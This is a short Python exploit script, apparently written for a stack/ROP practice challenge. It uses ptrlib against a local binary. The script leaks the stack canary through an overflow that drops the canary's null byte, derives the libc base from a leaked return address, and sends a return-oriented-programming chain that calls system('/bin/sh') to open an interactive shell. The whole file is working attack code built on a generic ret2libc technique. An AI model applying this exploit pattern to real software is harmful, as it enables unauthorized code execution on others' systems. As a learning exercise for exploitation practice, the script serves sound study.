from ptrlib import *

binpath = "../../../problems/stack/rop/medium"
libcpath = "/usr/lib/libc.so.6"

io = Process(binpath)
elf = ELF(binpath)
libc = ELF(libcpath)


def leak_canary():
    payload = b"A" * 0x18
    payload += b"A"

    io.sendafter(">> ", payload)
    io.recvuntil(payload)
    return u64(b"\0" + io.recv(7))


def leak_libc_base():
    payload = b"A" * 0x18
    payload += b"B" * 0x8
    payload += b"C" * 0x8

    io.sendafter(">> ", payload)
    io.recvuntil(payload)

    addr_libc_start = u64(io.recv(6)) - 0x75  # main -> __libc_start_call_main + 0x75
    offset_libc_start = 0x27640  # see medium-gdb.py

    libc.base = addr_libc_start - offset_libc_start
    return


def rop_to_system(canary):
    payload = b"A" * 0x18
    payload += p64(canary)
    payload += b"B" * 0x8
    payload += flat(
        [
            next(libc.gadget("pop rdi; ret")) or 0,
            next(libc.search(b"/bin/sh\0")) or 0,
            next(libc.gadget("ret")) or 0,
            libc.symbol("system") or 0,
        ],
        map=p64,
    )

    io.sendafter(">> ", payload)
    return


def main():
    input()
    canary = leak_canary()
    print(f"canary: {hex(canary)}")
    leak_libc_base()
    rop_to_system(canary)

    io.interactive()
    return


if __name__ == "__main__":
    main()
